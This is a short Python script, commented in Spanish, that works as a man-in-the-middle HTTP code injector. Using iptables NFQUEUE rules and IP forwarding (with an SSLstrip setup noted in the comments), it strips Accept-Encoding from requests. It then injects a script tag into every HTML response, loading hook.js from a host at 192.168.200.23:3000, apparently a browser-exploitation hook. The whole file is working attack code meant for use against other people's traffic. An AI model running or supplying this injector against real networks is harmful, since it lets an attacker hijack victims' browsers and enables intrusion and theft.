#!/usr/bin/env python
# Para que funcione necesitamos crear la regla en IPTABLES: iptables -I FORWARD -j NFQUEUE --queue-num 0
#Importante que siempre este enabled el ip_forward para eso: echo 1 > /proc/sys/net/ipv4/ip_forward

# Para que funcione en nuesta compu (pruebas):  iptables -I OUTPUT -j NFQUEUE --queue-num 0
# Para que funcione en nuesta compu (pruebas):  iptables -I INPUT -j NFQUEUE --queue-num 0
# Siempre luego: iptables --flush

#CON SSLtrip
# iptables -t nat PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# Siempre luego: iptables --flush

#Aqui importamos modulos
import netfilterqueue
import scapy.all as scapy
import re

#Funcion para definir el paquete reemplazado
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet



#Esta funcion Process Packet nos permite ver cuando los paquetes son HTTP y las filtra, analizando el archivo puedes crear tus propios paquetes.
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")

#Este es el metodo de regex para cambiar la linea del paquete que necesitamos quitar
#metodo para python strings = .replace()

            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            # print(scapy_packet.show())
            injection_code = '<script src="http://192.168.200.23:3000/hook.js"></script>'
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
